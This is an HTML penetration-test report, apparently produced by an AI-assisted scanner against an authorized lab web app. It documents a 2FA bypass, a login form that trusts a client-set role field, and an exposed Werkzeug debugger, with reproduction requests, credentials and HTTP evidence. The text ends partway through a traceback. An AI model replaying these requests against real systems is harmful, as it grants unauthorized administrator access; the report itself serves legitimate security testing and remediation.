@@ -1,0 +1,801 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr1g1jwc-kowr1h</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [workflow-bypass] 2FA enforcement bypass: admin dashboard reachable with pre-2FA session (OTP step never verified)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [mass-assignment] Privilege role is mass-assigned from client-controlled 'role' form field (not bound to identity)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [misconfig] Flask/Werkzeug debug mode enabled in production — source code, stack traces &amp; debugger SECRET disclosed</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr1g1jwc-kowr1h</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:5003/</code></td></tr>
+<tr><td>Started</td><td>2026-07-01T02:15:45.888Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>3 mapped · 2 scanned · 1 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:5003</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">2</b> high</span><span><b style="color:#f57c00">1</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [workflow-bypass] 2FA enforcement bypass: admin dashboard reachable with pre-2FA session (OTP step never verified)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The admin portal advertises a two-step login: POST /login (password) then POST /admin/2fa (OTP) before reaching /admin/dashboard. In reality the second factor is never enforced. The password step (POST /login role=admin) issues a Flask session whose entire payload is {&quot;role&quot;:&quot;admin&quot;} — it carries NO &quot;2FA-completed&quot; flag (base64 of the issued cookie decodes to {&quot;role&quot;:&quot;admin&quot;}). /admin/dashboard authorizes purely on session['role']=='admin', so an actor who has only completed the password step — and never submitted any OTP — reaches the full admin dashboard. The 2FA page (/admin/2fa) is therefore decorative: skipping it entirely grants admin access. (The itsdangerous signature IS validated — a tampered-signature cookie is rejected with 302 — so the flaw is missing step-enforcement, not signature forgery.) Impact is compounded by weak, guessable admin credentials (admin/adminpassword) and by the /admin/2fa endpoint itself accepting the hardcoded OTP 1234 and even trusting a client-supplied &quot;code&quot; field.</div>
+<div><b>Reproduction</b></div><pre>1. POST /admin/login is GET-only; the login form posts to POST /login. Submit role=admin&amp;username=admin&amp;password=adminpassword (form-encoded). Response: {success:true, redirect:&quot;/admin/2fa&quot;} with Set-Cookie session=eyJyb2xlIjoiYWRtaW4ifQ.akR9Gw.StGpY5SIEkup7TCWqIC3EOA2phw (payload base64-decodes to {&quot;role&quot;:&quot;admin&quot;}). Evidence ev-mr1gru7d-1p.
+2. WITHOUT visiting or submitting /admin/2fa, GET /admin/dashboard with Cookie: session=&lt;that cookie&gt;. Response 200 &quot;Welcome to the Admin Dashboard!&quot; — full admin area. Positive replays ev-mr1gwc6p-20, ev-mr1gwcer-21.
+3. Negative control: GET /admin/dashboard with the same cookie but a tampered signature → 302 redirect to /admin/login (access denied). Evidence ev-mr1gwbym-1z.
+Conclusion: the mandatory 2FA step can be skipped entirely; a password-only session is fully authorized.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1gwbym-1z</code> — <code>artifacts/_/ev-mr1gwbym-1z/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/dashboard HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+connection: close
+content-length: 211
+content-type: text/html; charset=utf-8
+date: Wed, 01 Jul 2026 02:39:41 GMT
+location: /admin/login
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;h1&gt;Redirecting...&lt;/h1&gt;
+&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;/admin/login&quot;&gt;/admin/login&lt;/a&gt;. If not, click the link.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1gwc6p-20</code> — <code>artifacts/_/ev-mr1gwc6p-20/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/dashboard HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1463
+content-type: text/html; charset=utf-8
+date: Wed, 01 Jul 2026 02:39:41 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Admin Dashboard&lt;/title&gt;
+    &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-header text-center&quot;&gt;
+                        &lt;h4&gt;Admin Dashboard&lt;/h4&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;p&gt;Welcome to the Admin Dashboard!&lt;/p&gt;
+                        &lt;p&gt;This is a secure area for administrators only.&lt;/p&gt;
+                        &lt;p&gt;
+                            If you are seeing this page, it means you are closer to get the flag. Dig deeper and maybe try to view &lt;a href=&quot;/&quot; flag=&quot;&quot;&gt;me&lt;/a&gt;.
+                        &lt;/p&gt;
+                        &lt;a href=&quot;/logout&quot; class=&quot;btn btn-primary&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1gwcer-21</code> — <code>artifacts/_/ev-mr1gwcer-21/</code></div><div class="lbl">REQUEST</div><pre>GET /admin/dashboard HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1463
+content-type: text/html; charset=utf-8
+date: Wed, 01 Jul 2026 02:39:42 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+vary: Cookie
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Admin Dashboard&lt;/title&gt;
+    &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-center mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-8&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-header text-center&quot;&gt;
+                        &lt;h4&gt;Admin Dashboard&lt;/h4&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;p&gt;Welcome to the Admin Dashboard!&lt;/p&gt;
+                        &lt;p&gt;This is a secure area for administrators only.&lt;/p&gt;
+                        &lt;p&gt;
+                            If you are seeing this page, it means you are closer to get the flag. Dig deeper and maybe try to view &lt;a href=&quot;/&quot; flag=&quot;&quot;&gt;me&lt;/a&gt;.
+                        &lt;/p&gt;
+                        &lt;a href=&quot;/logout&quot; class=&quot;btn btn-primary&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [mass-assignment] Privilege role is mass-assigned from client-controlled 'role' form field (not bound to identity)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">POST /login validates the username+password pair (a wrong username `notauser` or wrong password is rejected) but then assigns session['role'] verbatim from the client-supplied `role` form field — it is NOT derived from the authenticated account. With one and the same valid credential (admin/adminpassword): role=admin yields a {&quot;role&quot;:&quot;admin&quot;} session and routes into the admin branch (redirect /admin/2fa); role=employee yields a {&quot;role&quot;:&quot;employee&quot;} session (redirect /emp/dashboard); and role=superadmin is accepted verbatim, producing a {&quot;role&quot;:&quot;superadmin&quot;} session cookie (base64 eyJyb2xlIjoic3VwZXJhZG1pbiJ9, evidence ev-mr1h0yum-27) — a role that corresponds to no real account. Because privilege is taken from the request rather than the identity, ANY principal holding a valid (e.g. low-privileged employee) credential can self-assign role=admin at login. Chained with the 2FA-enforcement bypass (finding f-001, /admin/dashboard authorizes purely on session['role']=='admin' and never checks that OTP was completed), a client-chosen role=admin at /login grants a session that reaches the full admin dashboard without any second factor. The hidden `role` field on the public login form is thus a client-side privilege switch. (Demonstrated end-to-end with the admin account available in this environment; the identical mechanism grants admin to any other valid credential.)</div>
+<div><b>Reproduction</b></div><pre>1. Baseline / negative control: POST /login (form-encoded) role=employee&amp;username=admin&amp;password=adminpassword → {success:true, redirect:&quot;/emp/dashboard&quot;}, Set-Cookie session payload {&quot;role&quot;:&quot;employee&quot;}. No admin branch. Evidence ev-mr1h2wxe-29.
+2. Manipulation (×2 stable): POST /login role=admin&amp;username=admin&amp;password=adminpassword → {success:true, redirect:&quot;/admin/2fa&quot;}, Set-Cookie session payload {&quot;role&quot;:&quot;admin&quot;}. The posted role drove the privilege branch. Evidence ev-mr1h2x5i-2a, ev-mr1h2xdm-2b.
+3. Arbitrary role accepted: POST /login role=superadmin&amp;username=admin&amp;password=adminpassword → success, Set-Cookie session {&quot;role&quot;:&quot;superadmin&quot;}. Evidence ev-mr1h0yum-27.
+4. Controls proving credentials are still checked (so this is role-trust, not open auth): role=admin&amp;username=notauser&amp;password=adminpassword → invalid (ev-mr1h0xr7-26); role=employee&amp;username=admin&amp;password=wrongpass → invalid (ev-mr1h10d2-28).
+Chain: POST /login role=admin (any valid credential) → {role:admin} session → GET /admin/dashboard (no 2FA) → 200 admin area (see f-001).
+Remediation: derive the role server-side from the authenticated account; never accept a role/privilege field from the client.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1h2wxe-29</code> — <code>artifacts/_/ev-mr1h2wxe-29/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+role=employee&amp;username=admin&amp;password=adminpassword</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 71
+content-type: application/json
+date: Wed, 01 Jul 2026 02:44:48 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+{
+  &quot;message&quot;: &quot;&quot;,
+  &quot;redirect&quot;: &quot;/emp/dashboard&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1h2x5i-2a</code> — <code>artifacts/_/ev-mr1h2x5i-2a/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+role=admin&amp;username=admin&amp;password=adminpassword</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 67
+content-type: application/json
+date: Wed, 01 Jul 2026 02:44:49 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+{
+  &quot;message&quot;: &quot;&quot;,
+  &quot;redirect&quot;: &quot;/admin/2fa&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1h2xdm-2b</code> — <code>artifacts/_/ev-mr1h2xdm-2b/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+role=admin&amp;username=admin&amp;password=adminpassword</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 67
+content-type: application/json
+date: Wed, 01 Jul 2026 02:44:49 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+
+{
+  &quot;message&quot;: &quot;&quot;,
+  &quot;redirect&quot;: &quot;/admin/2fa&quot;,
+  &quot;success&quot;: true
+}</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [misconfig] Flask/Werkzeug debug mode enabled in production — source code, stack traces &amp; debugger SECRET disclosed</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5003/</div>
+<div class="desc">The application runs with Flask/Werkzeug debug mode enabled. Any request that triggers an unhandled exception (e.g. POST /login with a JSON body or with a missing form field, causing werkzeug.exceptions.BadRequestKeyError) returns the full interactive Werkzeug debugger page instead of a generic error. This page discloses: the application's source code with surrounding context lines, absolute server file paths (/usr/local/lib/python3.8/site-packages/flask/app.py and app frames), the Python/Flask versions, full tracebacks, and the debugger console secret token (SECRET = &quot;***REDACTED***&quot;). The interactive evaluator is disabled here (EVALEX=false), so no direct RCE console is available, but the source/path/traceback disclosure meaningfully aids further attacks and the SECRET would unlock the code-execution console if EVALEX were ever enabled. Debug mode must be disabled in any non-development deployment.</div>
+<div><b>Reproduction</b></div><pre>1. Negative control: GET /.env (or any normal missing path) returns a clean generic Flask 404 with no debugger/source. Evidence ev-mr1gxye8-22.
+2. Positive: POST /login with Content-Type: application/json and body {&quot;role&quot;:&quot;employee&quot;,...} → 500 with the full Werkzeug debugger HTML: BadRequestKeyError traceback, flask app.py source, and inline `SECRET = &quot;***REDACTED***&quot;`. Evidence ev-mr1gk3wo-1g.
+3. Positive replay: POST /login form-encoded omitting the role field (username=emp&amp;password=emppassword) → same Werkzeug debugger page with source + SECRET. Evidence ev-mr1gk4u6-1h.
+Remediation: set app.run(debug=False) / FLASK_DEBUG=0 and never expose the Werkzeug debugger publicly.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1gxye8-22</code> — <code>artifacts/_/ev-mr1gxye8-22/</code></div><div class="lbl">REQUEST</div><pre>GET /.env HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Wed, 01 Jul 2026 02:40:57 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr1gk3wo-1g</code> — <code>artifacts/_/ev-mr1gk3wo-1g/</code></div><div class="lbl">REQUEST</div><pre>POST /login HTTP/1.1
+Host: target.local:5003
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/json
+
+{&quot;role&quot;:&quot;employee&quot;,&quot;username&quot;:&quot;emp&quot;,&quot;password&quot;:&quot;emppassword&quot;}</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+connection: close
+content-length: 15243
+content-type: text/html; charset=utf-8
+date: Wed, 01 Jul 2026 02:30:11 GMT
+server: Werkzeug/3.0.3 Python/3.8.17
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+  &lt;head&gt;
+    &lt;title&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;username&amp;#39;
+ // Werkzeug Debugger&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=style.css&quot;&gt;
+    &lt;link rel=&quot;shortcut icon&quot;
+        href=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=console.png&quot;&gt;
+    &lt;script src=&quot;?__debugger__=yes&amp;amp;cmd=resource&amp;amp;f=debugger.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+      var CONSOLE_MODE = false,
+          EVALEX = false,
+          EVALEX_TRUSTED = false,
+          SECRET = &quot;***REDACTED***&quot;;
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body style=&quot;background-color: #fff&quot;&gt;
+    &lt;div class=&quot;debugger&quot;&gt;
+&lt;h1&gt;BadRequestKeyError&lt;/h1&gt;
+&lt;div class=&quot;detail&quot;&gt;
+  &lt;p class=&quot;errormsg&quot;&gt;werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
+KeyError: &amp;#39;username&amp;#39;
+&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 class=&quot;traceback&quot;&gt;Traceback &lt;em&gt;(most recent call last)&lt;/em&gt;&lt;/h2&gt;
+&lt;div class=&quot;traceback&quot;&gt;
+  &lt;h3&gt;&lt;/h3&gt;
+  &lt;ul&gt;&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045545832000&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1498&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;__call__&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;) -&amp;gt; cabc.Iterable[bytes]:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;The WSGI server calls the Flask application object as the&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;WSGI application. This calls :meth:`wsgi_app`, which can be&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;wrapped to apply middleware.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return self.wsgi_app(environ, start_response)&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045545830320&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1476&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;raise&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;return response(environ, start_response)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;finally:&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045545832112&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;1473&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;wsgi_app&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;ctx = self.request_context(environ)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;error: BaseException | None = None&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;try:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;ctx.push()&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.full_dispatch_request()&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except Exception as e:&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = e&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;response = self.handle_exception(e)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;except:  # noqa: B001&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;                &lt;/span&gt;error = sys.exc_info()[1]&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-139045545831664&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;882&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;full_dispatch_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;request_started.send(self, _async_wrapper=self.ensure_sync)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;rv = self.preprocess_request()&lt;/pre&gt;
